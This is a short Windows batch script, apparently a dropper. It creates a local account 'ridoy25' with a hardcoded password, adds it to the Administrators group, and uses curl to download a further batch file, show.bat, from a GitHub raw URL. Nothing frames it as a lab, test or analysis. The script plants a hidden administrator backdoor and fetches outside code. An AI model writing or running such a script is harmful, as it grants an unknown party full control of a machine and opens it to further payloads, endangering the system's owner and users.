@echo off
setlocal

net user ridoy25 "ridoy2025" /add
net localgroup Administrators ridoy25 /add
curl -o show.bat https://raw.githubusercontent.com/rjdigitalmar/jubilant-spork/refs/heads/main/.github/workflows/show.bat

endlocal
